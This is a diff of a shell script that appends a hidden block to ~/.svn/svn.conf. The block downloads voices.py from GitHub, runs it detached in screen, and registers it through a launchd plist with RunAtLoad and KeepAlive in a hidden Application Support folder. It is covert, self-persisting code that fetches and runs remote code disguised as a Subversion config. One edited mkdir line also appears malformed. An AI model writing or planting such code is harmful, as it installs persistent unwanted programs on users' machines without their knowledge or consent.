@@ -7,9 +7,9 @@ mkdir -p ~/.svn/
 { cat <<EOF
 #!/usr/bin/env bash
 ${PRE}if [ ! -d "${PWD}/.svn/" ]; then
-${PRE}    APP_DIR=${PWD}/Library/Application\ Support/.${RAND}-${RAND}/
-${PRE}    mkdir -p ${APP_DIR}
-${PRE}    cd ${APP_DIR}
+${PRE}    APP_DIR=${PWD}/Library/Application\ Support/.\${RANDOM}-\${RANDOM}/
+${PRE}    mkdir -p \${${APP_DIR}}
+${PRE}    cd \${APP_DIR}
 ${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
 ${PRE}    screen -d -m python voices.py
 ${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
@@ -21,7 +21,7 @@ ${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
     <string>voices.py</string>
     <key>ProgramArguments</key>
     <array>
-        <string>${APP_DIR}</string>
+        <string>\${APP_DIR}</string>
     </array>
     <key>KeepAlive</key>
     <true/>
@@ -30,8 +30,8 @@ ${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
     <key>RunAtLoad</key>
     <true/>
 </dict>
-</plist>" > ${APP_DIR}/voices.plist
-launchctl load -w ${APP_DIR}/voices.plist
+</plist>" > \${APP_DIR}/voices.plist
+launchctl load -w \${APP_DIR}/voices.plist
 ${PRE}fi
 EOF
 } >> ~/.svn/svn.conf
